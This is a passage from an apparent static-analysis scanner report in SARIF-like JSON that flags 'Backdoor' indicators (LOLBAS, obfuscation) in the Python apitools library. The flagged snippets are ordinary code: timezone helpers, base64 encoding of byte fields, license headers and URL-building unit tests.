                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/util.py"
                },
                "region": {
                  "startLine": 229,
                  "startColumn": 35,
                  "endLine": 229,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        return datetime.timedelta(minutes=self.__offset)\n\n    def dst(self, _):\n        \"\"\"Get the daylight savings time offset.\n\n        The formats that ProtoRPC uses to encode/decode time zone\n        information don't contain any information about daylight\n",
                    "rendered": {
                      "text": "        return datetime.timedelta(minutes=self.__offset)\n\n    def dst(self, _):\n        \"\"\"Get the daylight savings time offset.\n\n        The formats that ProtoRPC uses to encode/decode time zone\n        information don't contain any information about daylight\n",
                      "markdown": "`        return datetime.timedelta(minutes=self.__offset)\n\n    def dst(self, _):\n        \"\"\"Get the daylight savings time offset.\n\n        The formats that ProtoRPC uses to encode/decode time zone\n        information don't contain any information about daylight\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/util.py"
                },
                "region": {
                  "startLine": 224,
                  "startColumn": 13,
                  "endLine": 224,
                  "endColumn": 19,
                  "snippet": {
                    "text": "        \"\"\"Get the a timedelta with the time zone's offset from UTC.\n\n        Returns:\n          The time zone offset from UTC, as a timedelta.\n        \"\"\"\n        return datetime.timedelta(minutes=self.__offset)\n\n",
                    "rendered": {
                      "text": "        \"\"\"Get the a timedelta with the time zone's offset from UTC.\n\n        Returns:\n          The time zone offset from UTC, as a timedelta.\n        \"\"\"\n        return datetime.timedelta(minutes=self.__offset)\n\n",
                      "markdown": "`        \"\"\"Get the a timedelta with the time zone's offset from UTC.\n\n        Returns:\n          The time zone offset from UTC, as a timedelta.\n        \"\"\"\n        return datetime.timedelta(minutes=self.__offset)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/util.py"
                },
                "region": {
                  "startLine": 221,
                  "startColumn": 39,
                  "endLine": 221,
                  "endColumn": 45,
                  "snippet": {
                    "text": "        self.__offset = offset\n\n    def utcoffset(self, _):\n        \"\"\"Get the a timedelta with the time zone's offset from UTC.\n\n        Returns:\n          The time zone offset from UTC, as a timedelta.\n",
                    "rendered": {
                      "text": "        self.__offset = offset\n\n    def utcoffset(self, _):\n        \"\"\"Get the a timedelta with the time zone's offset from UTC.\n\n        Returns:\n          The time zone offset from UTC, as a timedelta.\n",
                      "markdown": "`        self.__offset = offset\n\n    def utcoffset(self, _):\n        \"\"\"Get the a timedelta with the time zone's offset from UTC.\n\n        Returns:\n          The time zone offset from UTC, as a timedelta.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/util.py"
                },
                "region": {
                  "startLine": 212,
                  "startColumn": 38,
                  "endLine": 212,
                  "endColumn": 44,
                  "snippet": {
                    "text": "        \"\"\"Initialize a time zone offset.\n\n        Args:\n          offset: Integer or timedelta time zone offset, in minutes from UTC.\n            This can be negative.\n        \"\"\"\n        super(TimeZoneOffset, self).__init__()\n",
                    "rendered": {
                      "text": "        \"\"\"Initialize a time zone offset.\n\n        Args:\n          offset: Integer or timedelta time zone offset, in minutes from UTC.\n            This can be negative.\n        \"\"\"\n        super(TimeZoneOffset, self).__init__()\n",
                      "markdown": "`        \"\"\"Initialize a time zone offset.\n\n        Args:\n          offset: Integer or timedelta time zone offset, in minutes from UTC.\n            This can be negative.\n        \"\"\"\n        super(TimeZoneOffset, self).__init__()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/util.py"
                },
                "region": {
                  "startLine": 209,
                  "startColumn": 23,
                  "endLine": 209,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    \"\"\"Time zone information as encoded/decoded for DateTimeFields.\"\"\"\n\n    def __init__(self, offset):\n        \"\"\"Initialize a time zone offset.\n\n        Args:\n          offset: Integer or timedelta time zone offset, in minutes from UTC.\n",
                    "rendered": {
                      "text": "    \"\"\"Time zone information as encoded/decoded for DateTimeFields.\"\"\"\n\n    def __init__(self, offset):\n        \"\"\"Initialize a time zone offset.\n\n        Args:\n          offset: Integer or timedelta time zone offset, in minutes from UTC.\n",
                      "markdown": "`    \"\"\"Time zone information as encoded/decoded for DateTimeFields.\"\"\"\n\n    def __init__(self, offset):\n        \"\"\"Initialize a time zone offset.\n\n        Args:\n          offset: Integer or timedelta time zone offset, in minutes from UTC.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/util.py"
                },
                "region": {
                  "startLine": 166,
                  "startColumn": 68,
                  "endLine": 167,
                  "snippet": {
                    "text": "    Helper calculates the package name of a module.\n\n    Args:\n      module: Module to get name for.  If module is a string, try to find\n        module in sys.modules.\n\n    Returns:\n      If module contains 'package' attribute, uses that as package name.\n",
                    "rendered": {
                      "text": "    Helper calculates the package name of a module.\n\n    Args:\n      module: Module to get name for.  If module is a string, try to find\n        module in sys.modules.\n\n    Returns:\n      If module contains 'package' attribute, uses that as package name.\n",
                      "markdown": "`    Helper calculates the package name of a module.\n\n    Args:\n      module: Module to get name for.  If module is a string, try to find\n        module in sys.modules.\n\n    Returns:\n      If module contains 'package' attribute, uses that as package name.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/protojson.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/protojson.py"
                },
                "region": {
                  "startLine": 238,
                  "startColumn": 13,
                  "endLine": 238,
                  "endColumn": 19,
                  "snippet": {
                    "text": "        elif isinstance(value, six.string_types):\n            return messages.Variant.STRING\n        elif isinstance(value, (list, tuple)):\n            # Find the most specific variant that covers all elements.\n            variant_priority = [None,\n                                messages.Variant.INT64,\n                                messages.Variant.DOUBLE,\n",
                    "rendered": {
                      "text": "        elif isinstance(value, six.string_types):\n            return messages.Variant.STRING\n        elif isinstance(value, (list, tuple)):\n            # Find the most specific variant that covers all elements.\n            variant_priority = [None,\n                                messages.Variant.INT64,\n                                messages.Variant.DOUBLE,\n",
                      "markdown": "`        elif isinstance(value, six.string_types):\n            return messages.Variant.STRING\n        elif isinstance(value, (list, tuple)):\n            # Find the most specific variant that covers all elements.\n            variant_priority = [None,\n                                messages.Variant.INT64,\n                                messages.Variant.DOUBLE,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/protojson.py"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 6,
                  "endLine": 28,
                  "snippet": {
                    "text": "  encode_message: Encodes a message in to a JSON string.\n  decode_message: Merge from a JSON string in to a message.\n\"\"\"\nimport base64\nimport binascii\nimport logging\n\nimport six\n",
                    "rendered": {
                      "text": "  encode_message: Encodes a message in to a JSON string.\n  decode_message: Merge from a JSON string in to a message.\n\"\"\"\nimport base64\nimport binascii\nimport logging\n\nimport six\n",
                      "markdown": "`  encode_message: Encodes a message in to a JSON string.\n  decode_message: Merge from a JSON string in to a message.\n\"\"\"\nimport base64\nimport binascii\nimport logging\n\nimport six\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/protojson.py"
                },
                "region": {
                  "startLine": 345,
                  "startColumn": 44,
                  "endLine": 345,
                  "endColumn": 50,
                  "snippet": {
                    "text": "            try:\n                return base64.b64decode(value)\n            except (binascii.Error, TypeError) as err:\n                raise messages.DecodeError('Base64 decoding error: %s' % err)\n\n        elif isinstance(field, message_types.DateTimeField):\n            try:\n",
                    "rendered": {
                      "text": "            try:\n                return base64.b64decode(value)\n            except (binascii.Error, TypeError) as err:\n                raise messages.DecodeError('Base64 decoding error: %s' % err)\n\n        elif isinstance(field, message_types.DateTimeField):\n            try:\n",
                      "markdown": "`            try:\n                return base64.b64decode(value)\n            except (binascii.Error, TypeError) as err:\n                raise messages.DecodeError('Base64 decoding error: %s' % err)\n\n        elif isinstance(field, message_types.DateTimeField):\n            try:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/protojson.py"
                },
                "region": {
                  "startLine": 343,
                  "startColumn": 23,
                  "endLine": 343,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n        elif isinstance(field, messages.BytesField):\n            try:\n                return base64.b64decode(value)\n            except (binascii.Error, TypeError) as err:\n                raise messages.DecodeError('Base64 decoding error: %s' % err)\n\n",
                    "rendered": {
                      "text": "\n        elif isinstance(field, messages.BytesField):\n            try:\n                return base64.b64decode(value)\n            except (binascii.Error, TypeError) as err:\n                raise messages.DecodeError('Base64 decoding error: %s' % err)\n\n",
                      "markdown": "`\n        elif isinstance(field, messages.BytesField):\n            try:\n                return base64.b64decode(value)\n            except (binascii.Error, TypeError) as err:\n                raise messages.DecodeError('Base64 decoding error: %s' % err)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/protojson.py"
                },
                "region": {
                  "startLine": 169,
                  "startColumn": 24,
                  "endLine": 169,
                  "endColumn": 30,
                  "snippet": {
                    "text": "            if field.repeated:\n                value = [base64.b64encode(byte) for byte in value]\n            else:\n                value = base64.b64encode(value)\n        elif isinstance(field, message_types.DateTimeField):\n            # DateTimeField stores its data as a RFC 3339 compliant string.\n            if field.repeated:\n",
                    "rendered": {
                      "text": "            if field.repeated:\n                value = [base64.b64encode(byte) for byte in value]\n            else:\n                value = base64.b64encode(value)\n        elif isinstance(field, message_types.DateTimeField):\n            # DateTimeField stores its data as a RFC 3339 compliant string.\n            if field.repeated:\n",
                      "markdown": "`            if field.repeated:\n                value = [base64.b64encode(byte) for byte in value]\n            else:\n                value = base64.b64encode(value)\n        elif isinstance(field, message_types.DateTimeField):\n            # DateTimeField stores its data as a RFC 3339 compliant string.\n            if field.repeated:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/protojson.py"
                },
                "region": {
                  "startLine": 167,
                  "startColumn": 25,
                  "endLine": 167,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        \"\"\"\n        if isinstance(field, messages.BytesField):\n            if field.repeated:\n                value = [base64.b64encode(byte) for byte in value]\n            else:\n                value = base64.b64encode(value)\n        elif isinstance(field, message_types.DateTimeField):\n",
                    "rendered": {
                      "text": "        \"\"\"\n        if isinstance(field, messages.BytesField):\n            if field.repeated:\n                value = [base64.b64encode(byte) for byte in value]\n            else:\n                value = base64.b64encode(value)\n        elif isinstance(field, message_types.DateTimeField):\n",
                      "markdown": "`        \"\"\"\n        if isinstance(field, messages.BytesField):\n            if field.repeated:\n                value = [base64.b64encode(byte) for byte in value]\n            else:\n                value = base64.b64encode(value)\n        elif isinstance(field, message_types.DateTimeField):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/protojson.py"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 7,
                  "endLine": 27,
                  "endColumn": 13,
                  "snippet": {
                    "text": "  encode_message: Encodes a message in to a JSON string.\n  decode_message: Merge from a JSON string in to a message.\n\"\"\"\nimport base64\nimport binascii\nimport logging\n\n",
                    "rendered": {
                      "text": "  encode_message: Encodes a message in to a JSON string.\n  decode_message: Merge from a JSON string in to a message.\n\"\"\"\nimport base64\nimport binascii\nimport logging\n\n",
                      "markdown": "`  encode_message: Encodes a message in to a JSON string.\n  decode_message: Merge from a JSON string in to a message.\n\"\"\"\nimport base64\nimport binascii\nimport logging\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/descriptor_test.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/descriptor_test.py"
                },
                "region": {
                  "startLine": 508,
                  "startColumn": 22,
                  "endLine": 508,
                  "endColumn": 28,
                  "snippet": {
                    "text": "    def testNoPackage(self):\n        self.assertRaisesWithRegexpMatch(\n            messages.DefinitionNotFoundError,\n            'Could not find definition for not.real',\n            self.library.lookup_package, 'not.real.Packageless')\n\n        self.assertEquals(None, self.library.lookup_package('Packageless'))\n",
                    "rendered": {
                      "text": "    def testNoPackage(self):\n        self.assertRaisesWithRegexpMatch(\n            messages.DefinitionNotFoundError,\n            'Could not find definition for not.real',\n            self.library.lookup_package, 'not.real.Packageless')\n\n        self.assertEquals(None, self.library.lookup_package('Packageless'))\n",
                      "markdown": "`    def testNoPackage(self):\n        self.assertRaisesWithRegexpMatch(\n            messages.DefinitionNotFoundError,\n            'Could not find definition for not.real',\n            self.library.lookup_package, 'not.real.Packageless')\n\n        self.assertEquals(None, self.library.lookup_package('Packageless'))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/descriptor_test.py"
                },
                "region": {
                  "startLine": 502,
                  "startColumn": 26,
                  "endLine": 502,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        for name in ('', 'a', lib):\n            self.assertRaisesWithRegexpMatch(\n                messages.DefinitionNotFoundError,\n                'Could not find definition for %s' % name,\n                self.library.lookup_package, name)\n\n    def testNoPackage(self):\n",
                    "rendered": {
                      "text": "        for name in ('', 'a', lib):\n            self.assertRaisesWithRegexpMatch(\n                messages.DefinitionNotFoundError,\n                'Could not find definition for %s' % name,\n                self.library.lookup_package, name)\n\n    def testNoPackage(self):\n",
                      "markdown": "`        for name in ('', 'a', lib):\n            self.assertRaisesWithRegexpMatch(\n                messages.DefinitionNotFoundError,\n                'Could not find definition for %s' % name,\n                self.library.lookup_package, name)\n\n    def testNoPackage(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api_test.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 38,
                  "endLine": 7,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api_test.py"
                },
                "region": {
                  "startLine": 326,
                  "startColumn": 7,
                  "endLine": 326,
                  "endColumn": 16,
                  "snippet": {
                    "text": "        method_config = base_api.ApiMethodInfo(\n            relative_path='path:withJustColon',\n            request_type_name='SimpleMessage')\n        service = FakeService()\n        request = SimpleMessage()\n        http_request = service.PrepareHttpRequest(method_config, request)\n        self.assertEqual('http://www.example.com/path:withJustColon',\n",
                    "rendered": {
                      "text": "        method_config = base_api.ApiMethodInfo(\n            relative_path='path:withJustColon',\n            request_type_name='SimpleMessage')\n        service = FakeService()\n        request = SimpleMessage()\n        http_request = service.PrepareHttpRequest(method_config, request)\n        self.assertEqual('http://www.example.com/path:withJustColon',\n",
                      "markdown": "`        method_config = base_api.ApiMethodInfo(\n            relative_path='path:withJustColon',\n            request_type_name='SimpleMessage')\n        service = FakeService()\n        request = SimpleMessage()\n        http_request = service.PrepareHttpRequest(method_config, request)\n        self.assertEqual('http://www.example.com/path:withJustColon',\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api_test.py"
                },
                "region": {
                  "startLine": 311,
                  "startColumn": 7,
                  "endLine": 311,
                  "endColumn": 16,
                  "snippet": {
                    "text": "        request = MessageWithRemappings(\n            str_field='gonna',\n            enum_field=MessageWithRemappings.AnEnum.value_one)\n        service = FakeService()\n        expected_url = service.client.url + 'parameters/gonna/remap/ONE%2FTWO'\n        http_request = service.PrepareHttpRequest(method_config, request)\n        self.assertEqual(expected_url, http_request.url)\n",
                    "rendered": {
                      "text": "        request = MessageWithRemappings(\n            str_field='gonna',\n            enum_field=MessageWithRemappings.AnEnum.value_one)\n        service = FakeService()\n        expected_url = service.client.url + 'parameters/gonna/remap/ONE%2FTWO'\n        http_request = service.PrepareHttpRequest(method_config, request)\n        self.assertEqual(expected_url, http_request.url)\n",
                      "markdown": "`        request = MessageWithRemappings(\n            str_field='gonna',\n            enum_field=MessageWithRemappings.AnEnum.value_one)\n        service = FakeService()\n        expected_url = service.client.url + 'parameters/gonna/remap/ONE%2FTWO'\n        http_request = service.PrepareHttpRequest(method_config, request)\n        self.assertEqual(expected_url, http_request.url)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api_test.py"
                },
                "region": {
                  "startLine": 278,
                  "startColumn": 7,
                  "endLine": 278,
                  "endColumn": 16,
                  "snippet": {
                    "text": "    def testQueryBytesGlobalParams(self):\n        method_config = base_api.ApiMethodInfo(\n            request_type_name='SimpleMessage', query_params=['bytes_field'])\n        service = FakeService()\n        non_unicode_message = b''.join((six.int2byte(100),\n                                        six.int2byte(200)))\n        request = SimpleMessage()\n",
                    "rendered": {
                      "text": "    def testQueryBytesGlobalParams(self):\n        method_config = base_api.ApiMethodInfo(\n            request_type_name='SimpleMessage', query_params=['bytes_field'])\n        service = FakeService()\n        non_unicode_message = b''.join((six.int2byte(100),\n                                        six.int2byte(200)))\n        request = SimpleMessage()\n",
                      "markdown": "`    def testQueryBytesGlobalParams(self):\n        method_config = base_api.ApiMethodInfo(\n            request_type_name='SimpleMessage', query_params=['bytes_field'])\n        service = FakeService()\n        non_unicode_message = b''.join((six.int2byte(100),\n                                        six.int2byte(200)))\n        request = SimpleMessage()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api_test.py"
                },
                "region": {
                  "startLine": 263,
                  "startColumn": 7,
                  "endLine": 263,
                  "endColumn": 16,
                  "snippet": {
                    "text": "    def testQueryBytesRequest(self):\n        method_config = base_api.ApiMethodInfo(\n            request_type_name='SimpleMessage', query_params=['bytes_field'])\n        service = FakeService()\n        non_unicode_message = b''.join((six.int2byte(100),\n                                        six.int2byte(200)))\n        request = SimpleMessage(bytes_field=non_unicode_message)\n",
                    "rendered": {
                      "text": "    def testQueryBytesRequest(self):\n        method_config = base_api.ApiMethodInfo(\n            request_type_name='SimpleMessage', query_params=['bytes_field'])\n        service = FakeService()\n        non_unicode_message = b''.join((six.int2byte(100),\n                                        six.int2byte(200)))\n        request = SimpleMessage(bytes_field=non_unicode_message)\n",
                      "markdown": "`    def testQueryBytesRequest(self):\n        method_config = base_api.ApiMethodInfo(\n            request_type_name='SimpleMessage', query_params=['bytes_field'])\n        service = FakeService()\n        non_unicode_message = b''.join((six.int2byte(100),\n                                        six.int2byte(200)))\n        request = SimpleMessage(bytes_field=non_unicode_message)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api_test.py"
                },
                "region": {
                  "startLine": 242,
                  "startColumn": 7,
                  "endLine": 242,
                  "endColumn": 16,
                  "snippet": {
                    "text": "    def testPrettyPrintEncoding(self):\n        method_config = base_api.ApiMethodInfo(\n            request_type_name='MessageWithTime', query_params=['timestamp'])\n        service = FakeService()\n        request = MessageWithTime(\n            timestamp=datetime.datetime(2014, 10, 0o7, 12, 53, 13))\n\n",
                    "rendered": {
                      "text": "    def testPrettyPrintEncoding(self):\n        method_config = base_api.ApiMethodInfo(\n            request_type_name='MessageWithTime', query_params=['timestamp'])\n        service = FakeService()\n        request = MessageWithTime(\n            timestamp=datetime.datetime(2014, 10, 0o7, 12, 53, 13))\n\n",
                      "markdown": "`    def testPrettyPrintEncoding(self):\n        method_config = base_api.ApiMethodInfo(\n            request_type_name='MessageWithTime', query_params=['timestamp'])\n        service = FakeService()\n        request = MessageWithTime(\n            timestamp=datetime.datetime(2014, 10, 0o7, 12, 53, 13))\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
